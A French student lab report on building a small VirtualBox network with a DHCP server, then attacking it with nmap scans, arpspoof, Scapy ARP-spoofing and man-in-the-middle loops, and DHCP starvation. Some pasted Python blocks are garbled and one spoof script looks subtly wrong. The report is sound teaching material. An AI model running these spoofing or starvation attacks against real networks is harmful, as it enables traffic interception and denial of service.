# PART I: Lab Setup
## 1. Setup IP

🌞 Définir une adresse IP statique sur chaque machine

dhcp.tp1.my 
```bash
[toto@localhost ~]$ ip a
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:e0:92:42 brd ff:ff:ff:ff:ff:ff
    inet 10.1.1.253/24 brd 10.1.1.255 scope global noprefixroute enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fee0:9242/64 scope link
       valid_lft forever preferred_lft forever
```
```bash
[toto@localhost ~]$ cat /etc/sysconfig/network-scripts/ifcfg-enp0s8
DEVICE=enp0s8
NAME=LAN1

ONBOOT=yes
BOOTPROTO=static

IPADDR=10.1.1.253
NETMASK=255.255.255.0
```
node1.tp1.my
```bash
[toto@node1 ~]$ ip a
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:be:d5:cd brd ff:ff:ff:ff:ff:ff
    inet 10.1.1.11/24 brd 10.1.1.255 scope global noprefixroute enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:febe:d5cd/64 scope link
       valid_lft forever preferred_lft forever
```
```bash
[toto@node1 ~]$ cat /etc/sysconfig/network-scripts/ifcfg-enps0s8
DEVICE=enp0s8
NAME=LAN1

ONBOOT=YES
BOOTPROTO=static

IPADDR=10.1.1.11
NETMASK=255.255.255.0
```
node2.tp1.my
```bash
[toto@node2 ~]$ cat /etc/sysconfig/network-scripts/ifcfg-enp0s8
DEVICE=enp0s8
NAME=LAN1

ONBOOT=yes
BOOTPROTO=static

IPADDR=10.1.1.12
NETMASK=255.255.255.0
```
```bash
[toto@node2 ~]$ ip a
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:93:02:66 brd ff:ff:ff:ff:ff:ff
    inet 10.1.1.12/24 brd 10.1.1.255 scope global noprefixroute enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe93:266/64 scope link
       valid_lft forever preferred_lft forever
```

🌞 Ping !

dhcp.tp1.my
```bash
[toto@dhcp ~]$ ping 10.1.1.11
PING 10.1.1.11 (10.1.1.11) 56(84) bytes of data.
64 bytes from 10.1.1.11: icmp_seq=1 ttl=64 time=0.944 ms
64 bytes from 10.1.1.11: icmp_seq=2 ttl=64 time=1.78 ms
64 bytes from 10.1.1.11: icmp_seq=3 ttl=64 time=1.84 ms
```
```bash
[toto@dhcp ~]$ ping 10.1.1.12
PING 10.1.1.12 (10.1.1.12) 56(84) bytes of data.
64 bytes from 10.1.1.12: icmp_seq=1 ttl=64 time=0.703 ms
64 bytes from 10.1.1.12: icmp_seq=2 ttl=64 time=0.522 ms
```
node1.tp1.my
```bash
[toto@node1 ~]$ ping 10.1.1.253
PING 10.1.1.253 (10.1.1.253) 56(84) bytes of data.
64 bytes from 10.1.1.253: icmp_seq=1 ttl=64 time=0.616 ms
64 bytes from 10.1.1.253: icmp_seq=2 ttl=64 time=1.77 ms
```
```bash
[toto@node1 ~]$ ping 10.1.1.12
PING 10.1.1.12 (10.1.1.12) 56(84) bytes of data.
64 bytes from 10.1.1.12: icmp_seq=1 ttl=64 time=1.34 ms
64 bytes from 10.1.1.12: icmp_seq=2 ttl=64 time=1.73 ms
```
node2.tp1.my
```bash
[toto@node2 ~]$ ping 10.1.1.253
PING 10.1.1.253 (10.1.1.253) 56(84) bytes of data.
64 bytes from 10.1.1.253: icmp_seq=1 ttl=64 time=0.847 ms
64 bytes from 10.1.1.253: icmp_seq=2 ttl=64 time=1.77 ms
```
```bash
[toto@node2 ~]$ ping 10.1.1.11
PING 10.1.1.11 (10.1.1.11) 56(84) bytes of data.
64 bytes from 10.1.1.11: icmp_seq=1 ttl=64 time=0.797 ms
64 bytes from 10.1.1.11: icmp_seq=2 ttl=64 time=1.21 ms
```
🦈 Capture ICMP

[ping1.pcap](/ping1.pcap)

🌞 Nommez les machines

```bash
[toto@dhcp ~]$ sudo hostnamectl
[sudo] password for toto:
 Static hostname: dhcp.tp1.my
       Icon name: computer-vm
         Chassis: vm 🖴
      Machine ID: 1279f215ae6b48dfaf6744f45186d548
         Boot ID: 2d4a5a40853745fda06d63b6e0345b50
  Virtualization: oracle
Operating System: Rocky Linux 9.5 (Blue Onyx)
     CPE OS Name: cpe:/o:rocky:rocky:9::baseos
          Kernel: Linux 5.14.0-503.23.1.el9_5.x86_64
    Architecture: x86-64
 Hardware Vendor: innotek GmbH
  Hardware Model: VirtualBox
Firmware Version: VirtualBox
```
```bash
[toto@node1 ~]$ sudo hostnamectl
[sudo] password for toto:
 Static hostname: node1.tp1.my
       Icon name: computer-vm
         Chassis: vm 🖴
      Machine ID: 1279f215ae6b48dfaf6744f45186d548
         Boot ID: c8387e7a628a460981f4bc334bdc68e3
  Virtualization: oracle
Operating System: Rocky Linux 9.5 (Blue Onyx)
     CPE OS Name: cpe:/o:rocky:rocky:9::baseos
          Kernel: Linux 5.14.0-503.23.1.el9_5.x86_64
    Architecture: x86-64
 Hardware Vendor: innotek GmbH
  Hardware Model: VirtualBox
Firmware Version: VirtualBox
```
```bash
[toto@node2 ~]$ sudo hostnamectl
[sudo] password for toto:
 Static hostname: node2.tp1.my
       Icon name: computer-vm
         Chassis: vm 🖴
      Machine ID: 1279f215ae6b48dfaf6744f45186d548
         Boot ID: 713f18956c6548e1a5f3a77727aa0ecb
  Virtualization: oracle
Operating System: Rocky Linux 9.5 (Blue Onyx)
     CPE OS Name: cpe:/o:rocky:rocky:9::baseos
          Kernel: Linux 5.14.0-503.23.1.el9_5.x86_64
    Architecture: x86-64
 Hardware Vendor: innotek GmbH
  Hardware Model: VirtualBox
Firmware Version: VirtualBox
```
🌞 Fermer tous les ports inutilement ouverts dans le firewall

```bash
[toto@dhcp ~]$ sudo firewall-cmd --permanent --remove-service dhcpv6-client
sudo firewall-cmd --permanent --remove-service cockpit
sudo firewall-cmd --reload
success
success
success

[toto@dhcp ~]$ sudo firewall-cmd --list-all
public (active)
  target: default
  icmp-block-inversion: no
  interfaces: enp0s3 enp0s8
  sources:
  services: ssh
  ports:
  protocols:
  forward: yes
  masquerade: no
  forward-ports:
  source-ports:
  icmp-blocks:
  rich rules:
```
🌞 Remplir le fichier hosts

```bash
[toto@node1 ~]$ cat /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
10.1.1.253 dhcp.tp1.my dhcp
10.1.1.12 node2.tp1.my node2
```
```bash
[toto@node1 ~]$ ping node2.tp1.my
PING node2.tp1.my (10.1.1.12) 56(84) bytes of data.
64 bytes from node2.tp1.my (10.1.1.12): icmp_seq=1 ttl=64 time=0.896 ms
64 bytes from node2.tp1.my (10.1.1.12): icmp_seq=2 ttl=64 time=0.850 ms

[toto@node1 ~]$ ping node2
PING node2.tp1.my (10.1.1.12) 56(84) bytes of data.
64 bytes from node2.tp1.my (10.1.1.12): icmp_seq=1 ttl=64 time=0.651 ms
64 bytes from node2.tp1.my (10.1.1.12): icmp_seq=2 ttl=64 time=0.659 ms
```

## 2. ARP

🌞 Table ARP

```bash
[toto@node1 ~]$ ip neigh show
10.1.1.1 dev enp0s8 lladdr 0a:00:27:00:00:03 DELAY
10.1.1.12 dev enp0s8 lladdr 08:00:27:93:02:66 STALE
10.1.1.253 dev enp0s8 lladdr 08:00:27:e0:92:42 STALE
10.0.2.2 dev enp0s3 lladdr 52:54:00:12:35:02 REACHABLE
```
```bash
[toto@dhcp ~]$ ip a
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:e0:92:42 brd ff:ff:ff:ff:ff:ff
    inet 10.1.1.253/24 brd 10.1.1.255 scope global noprefixroute enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fee0:9242/64 scope link
       valid_lft forever preferred_lft forever
```
```bash
[toto@node2 ~]$ ip a
1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:93:02:66 brd ff:ff:ff:ff:ff:ff
    inet 10.1.1.12/24 brd 10.1.1.255 scope global noprefixroute enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe93:266/64 scope link
       valid_lft forever preferred_lft forever
```
🌞 Manipuler la table ARP

```bash
[toto@node1 ~]$ ip neigh show
10.1.1.1 dev enp0s8 lladdr 0a:00:27:00:00:03 DELAY
10.1.1.12 dev enp0s8 lladdr 08:00:27:93:02:66 STALE
10.1.1.253 dev enp0s8 lladdr 08:00:27:e0:92:42 STALE
10.0.2.2 dev enp0s3 lladdr 52:54:00:12:35:02 STALE
```
```bash
[toto@node1 ~]$ sudo ip neigh flush all
[sudo] password for toto:
[toto@node1 ~]$ sudo ip neigh show
10.1.1.1 dev enp0s8 lladdr 0a:00:27:00:00:03 REACHABLE
```
```bash
[toto@node1 ~]$ ping node2
PING node2.tp1.my (10.1.1.12) 56(84) bytes of data.
64 bytes from node2.tp1.my (10.1.1.12): icmp_seq=1 ttl=64 time=2.39 ms
64 bytes from node2.tp1.my (10.1.1.12): icmp_seq=2 ttl=64 time=0.803 ms
^C
--- node2.tp1.my ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 0.803/1.596/2.389/0.793 ms
[toto@node1 ~]$ sudo ip neigh show
10.1.1.1 dev enp0s8 lladdr 0a:00:27:00:00:03 REACHABLE
10.1.1.12 dev enp0s8 lladdr 08:00:27:93:02:66 REACHABLE
10.0.2.2 dev enp0s3 lladdr 52:54:00:12:35:02 STALE
```
🦈 Capture ARP

[arp_1.pcap](/arp_1.pcap)

# PART II: DHCP Service
## 1. Install and conf

🌞 Installer un service DHCP sur la machine dhcp.tp1.my

```bash
[toto@dhcp ~]$ sudo dnf install -y dhcp-server

[toto@dhcp ~]$ sudo cat /etc/dhcp/dhcpd.conf
#
# DHCP Server Configuration file.
#   see /usr/share/doc/dhcp-server/dhcpd.conf.example
#   see dhcpd.conf(5) man page
#

# create new

# specify domain name

option domain-name     "tp1";
# specify DNS server's hostname or IP address

option domain-name-servers     1.1.1.1;
# default lease time

default-lease-time 86400;
# max lease time

max-lease-time 172800;
# this DHCP server to be declared valid

authoritative;
# specify network address and subnetmask

subnet 10.1.1.0 netmask 255.255.255.0 {
    # specify the range of lease IP address
    range dynamic-bootp 10.1.1.100 10.1.1.200;
# specify broadcast address
    option broadcast-address 10.1.1.255;
}

[toto@dhcp ~]$ firewall-cmd --add-service=dhcp
success
[toto@dhcp ~]$ firewall-cmd --runtime-to-permanent 
success
[toto@dhcp ~]$ systemctl enable --now dhcpd 
```
```bash
[toto@dhcp ~]$ sudo systemctl status dhcpd
● dhcpd.service - DHCPv4 Server Daemon
     Loaded: loaded (/usr/lib/systemd/system/dhcpd.service; enabled; preset: disabled)
     Active: active (running) since Tue 2025-02-11 15:35:01 CET; 13s ago
       Docs: man:dhcpd(8)
             man:dhcpd.conf(5)
   Main PID: 1957 (dhcpd)
     Status: "Dispatching packets..."
      Tasks: 1 (limit: 4656)
     Memory: 4.6M
        CPU: 11ms
     CGroup: /system.slice/dhcpd.service
             └─1957 /usr/sbin/dhcpd -f -cf /etc/dhcp/dhcpd.conf -user dhcpd -group dhcpd --no-pid

Feb 11 15:35:01 dhcp.tp1.my dhcpd[1957]:
Feb 11 15:35:01 dhcp.tp1.my dhcpd[1957]: No subnet declaration for enp0s3 (10.0.2.15).
Feb 11 15:35:01 dhcp.tp1.my dhcpd[1957]: ** Ignoring requests on enp0s3.  If this is not what
Feb 11 15:35:01 dhcp.tp1.my dhcpd[1957]:    you want, please write a subnet declaration
Feb 11 15:35:01 dhcp.tp1.my dhcpd[1957]:    in your dhcpd.conf file for the network segment
Feb 11 15:35:01 dhcp.tp1.my dhcpd[1957]:    to which interface enp0s3 is attached. **
Feb 11 15:35:01 dhcp.tp1.my dhcpd[1957]:
Feb 11 15:35:01 dhcp.tp1.my dhcpd[1957]: Sending on   Socket/fallback/fallback-net
Feb 11 15:35:01 dhcp.tp1.my dhcpd[1957]: Server starting service.
Feb 11 15:35:01 dhcp.tp1.my systemd[1]: Started DHCPv4 Server Daemon.
```

## 2. Ask an address

🌞 Demander une adresse IP depuis node1.tp1.my

```bash
[toto@node1 ~]$ ip a
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:be:d5:cd brd ff:ff:ff:ff:ff:ff
    inet 10.1.1.100/24 brd 10.1.1.255 scope global dynamic noprefixroute enp0s8
       valid_lft 86208sec preferred_lft 86208sec
    inet6 fe80::a00:27ff:febe:d5cd/64 scope link
       valid_lft forever preferred_lft forever
```
```bash
[toto@node1 ~]$ cat /etc/resolv.conf
# Generated by NetworkManager
search tp1 tp1.my
nameserver 8.8.8.8
nameserver 1.1.1.1
```
🦈 Capture DHCP

[dhcp_1.pcap](/dhcp_1.pcap)

# Part III : Scan me if you can
## 1. Network scan

🌞 Effectuer un scan ARP depuis la machine attaquante node1.tp1.my

```bash
[toto@node1 ~]$ sudo nmap -sn -PR 10.1.1.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2025-02-11 16:31 CET
Nmap scan report for 10.1.1.1
Host is up (0.00068s latency).
MAC Address: 0A:00:27:00:00:03 (Unknown)
Nmap scan report for node2.tp1.my (10.1.1.12)
Host is up (0.00050s latency).
MAC Address: 08:00:27:93:02:66 (Oracle VirtualBox virtual NIC)
Nmap scan report for dhcp.tp1.my (10.1.1.253)
Host is up (0.00053s latency).
MAC Address: 08:00:27:E0:92:42 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.1.1.100
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.96 seconds
```
[nmap_1.pcap](/nmap_1.pcap)

🌞 Effectuer un scan de service et d'OS depuis la machine attaquante node1.tp1.my

```bash
[toto@node1 ~]$ sudo nmap -p 22,67,68 -sV -O dhcp.tp1.my
[sudo] password for toto:
Starting Nmap 7.92 ( https://nmap.org ) at 2025-02-11 16:40 CET
Nmap scan report for dhcp.tp1.my (10.1.1.253)
Host is up (0.0014s latency).

PORT   STATE    SERVICE VERSION
22/tcp open     ssh     OpenSSH 8.7 (protocol 2.0)
67/tcp filtered dhcps
68/tcp filtered dhcpc
MAC Address: 08:00:27:E0:92:42 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (94%), Linux 3.10 - 4.11 (94%), Linux 3.2 - 4.9 (94%), Linux 3.4 - 3.10 (94%), Linux 4.15 - 5.6 (94%), Linux 5.1 (94%), Linux 2.6.32 - 3.10 (93%), Linux 2.6.32 - 3.13 (93%), Linux 3.10 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.56 seconds
```
[nmap_2.pcap](/nmap_2.pcap)

# Part IV : ARP Poisoning
## 1. Simple ARP spoof

🌞 Empoisonnez la table ARP de node2.tp1.my

```bash	
[toto@node1 ~]$ sudo arpspoof -i enp0s8 -t 10.1.1.12 -r 10.1.1.1
8:0:27:be:d5:cd 8:0:27:93:2:66 0806 42: arp reply 10.1.1.1 is-at 8:0:27:be:d5:cd
8:0:27:be:d5:cd a:0:27:0:0:7 0806 42: arp reply 10.1.1.12 is-at 8:0:27:be:d5:cd
```
```bash
[toto@node2 ~]$ ip neigh show
10.0.2.2 dev enp0s3 lladdr 52:54:00:12:35:02 STALE
10.1.1.1 dev enp0s8 lladdr 08:00:27:be:d5:cd REACHABLE
```
🦈 Capture ARP Spoof

[arp_spoof_1.pcap](/arp_spoof_1.pcap)

## 2. Avec Scapy

🌞Ecrire un script Scapy qui fait le travail de arpspoof

```bash
[toto@node1 ~]$ sudo python
Python 3.9.21 (main, Dec  5 2024, 00:00:00)
[GCC 11.5.0 20240719 (Red Hat 11.5.0-2)] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from scapy.all import *
ker_ip = "10.1.1.100"
victim_mac = "08:00:27:93:02:66"
while True:
    ans, unans = sr(ARP(op=2, pdst=victim_ip, psrc=attacker_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac))>>>
>>> victim_ip = "10.1.1.12"
>>> attacker_ip = "10.1.1.100"
>>> victim_mac = "08:00:27:93:02:66"
>>> while True:
...     ans, unans = sr(ARP(op=2, pdst=victim_ip, psrc=attacker_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac))
...
Begin emission:
Finished sending 1 packets.
..........
.................
.........
......
....
....
......................^C
Received 72 packets, got 0 answers, remaining 1 packets
Begin emission:
Finished sending 1 packets.
........^C
Received 8 packets, got 0 answers, remaining 1 packets
Begin emission:
Finished sending 1 packets.
```
```bash
[toto@node2 ~]$ ip neigh show
10.0.2.2 dev enp0s3 lladdr 52:54:00:12:35:02 STALE
10.1.1.1 dev enp0s8 lladdr 0a:00:27:00:00:07 DELAY
10.1.1.100 dev enp0s8 lladdr 08:00:27:93:02:66 STALE
```

[arp_spoof.py](/arp_spoof.py)

🦈 Capture ARP Spoof Scapy

[arp_spoof_2.pcap](/arp_spoof_2.pcap)

## 3. Man in the middle

🌞 Mettre en place un MITM ARP

```bash
[toto@node1 ~]$ sudo python
[sudo] password for toto:
Python 3.9.21 (main, Dec  5 2024, 00:00:00)
[GCC 11.5.0 20240719 (Red Hat 11.5.0-2)] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from scapy.all import *
_ip = "10.1.1.100"
node2_ip = "10.1.1.12"

node2_mac = "08:00:27:93:02:66"
dhcp_mac = "08:00:27:e0:92:42"

while True:
    ans, unans = sr(ARP(op=2, pdst=dhcp_ip, psrc=node2_ip, hwdst=dhcp_mac))
    ans, unans = sr(ARP(op=2, pdst=node2_ip, psrc=dhcp_ip, hwdst=node2_mac))>>>
>>> dhcp_ip = "10.1.1.253"
>>> node1_ip = "10.1.1.100"
>>> node2_ip = "10.1.1.12"
>>>
>>> node2_mac = "08:00:27:93:02:66"
>>> dhcp_mac = "08:00:27:e0:92:42"
>>>
>>> while True:
...     ans, unans = sr(ARP(op=2, pdst=dhcp_ip, psrc=node2_ip, hwdst=dhcp_mac))
...     ans, unans = sr(ARP(op=2, pdst=node2_ip, psrc=dhcp_ip, hwdst=node2_mac))
...
Begin emission:
Finished sending 1 packets.
..........................................................................................................................
....
.............^C
Received 139 packets, got 0 answers, remaining 1 packets
Begin emission:
Finished sending 1 packets.
........^C
Received 8 packets, got 0 answers, remaining 1 packets
Begin emission:
Finished sending 1 packets.
.............................................................................................................................................................^C
Received 2030 packets, got 0 answers, remaining 1 packets
Begin emission:
Finished sending 1 packets.
```

🦈 Capture MITM ARP

[arp_mitm_1.pcap](/arp_mitm_1.pcap)

# Part V : Play with DHCP
## 1. DHCP starvation

🌞 Ecrire un script Scapy pour mettre en place un DHCP Starvation

[dhcp_starvation.py](/dhcp_starvation.py)

🌞 Afficher la liste des bails DHCP depuis dhcp.tp1.my
   
```bash
   [toto@dhcp ~]$ grep "lease" /var/lib/dhcpd/dhcpd.leases | wc -l
104
```
🦈 Capture DHCP Starvation

🌞 Preuve de DOS du réseau

🦈 Capture DOS réseau

## 2. DHCP spoofing

🌞 Ecrire un script Scapy pour mettre en place un DHCP Spoofing

